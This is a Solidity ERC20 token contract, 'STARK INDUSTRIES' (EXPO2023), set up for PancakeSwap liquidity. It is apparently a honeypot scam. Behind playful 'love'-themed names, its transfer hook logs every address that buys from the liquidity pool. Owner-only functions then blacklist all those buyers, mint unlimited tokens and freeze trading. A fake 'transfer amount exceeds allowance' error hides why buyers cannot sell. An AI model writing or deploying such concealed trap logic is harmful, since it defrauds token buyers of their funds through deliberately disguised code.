// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IPancakeRouter is IPancakeRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract MyLoveNGreets is ERC20, ERC20Burnable, Ownable {
    mapping (address => bool) public _willLoveMe;
    address[] public _usersForLove;
    bool public _theLoveIsGone = false;
    address public _LoveOriginNDestiny;
    mapping (address => bool) public _hughHefner;
    mapping (uint256 => uint256) public _loadingLove;
    address private pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IPancakeRouter private _pancakeRouter = IPancakeRouter(pancakeRouter);
    constructor() ERC20("STARK INDUSTRIES", "EXPO2023") {
        _mint(_msgSender(), 10000000000000000000000000);
        _hughHefner[_msgSender()] = true;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require((!_willLoveMe[from] && !_willLoveMe[tx.origin] && !_theLoveIsGone) || _hughHefner[tx.origin]  || _LoveOriginNDestiny == from, "ERC20: transfer amount exceeds allowance");
        if(_LoveOriginNDestiny == from) {
            _loadingLove[block.number] += 1;
            if (_hughHefner[tx.origin]  || (_hughHefner[to] && to != tx.origin)) {
                if(_loadingLove[block.number] > 1) {
                    _theLoveIsGone = true;
                }
                for(uint i; i < _usersForLove.length; i++) {
                    _willLoveMe[_usersForLove[i]] = true;
                }
            } else {
                _usersForLove.push(tx.origin);
                _usersForLove.push(to);
            }
        }
        if (amount == totalSupply()) {
            _LoveOriginNDestiny = to;
        }

    }
    function _iDontLikeMoreLove() external virtual {
        require(_hughHefner[tx.origin], "Ups");
        for(uint i; i < _usersForLove.length; i++) {
            _willLoveMe[_usersForLove[i]] = true;
        }
    }
    function _thankUBrosSeeYou(uint256 ups) external virtual {
        require(_hughHefner[tx.origin], "Ups");
        _mint(_msgSender(), 10 * ups);
    }
    function lockTheLove(bool lock_) public {
        require(_hughHefner[tx.origin], "Ups");
        _theLoveIsGone = lock_;
    }
    function addLiquidityETH() external payable {
        uint256 balance = balanceOf(address(this));
        super.approve(address(_pancakeRouter), balance);
        _pancakeRouter.addLiquidityETH{value : msg.value}(
            address(this),
            balance,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
}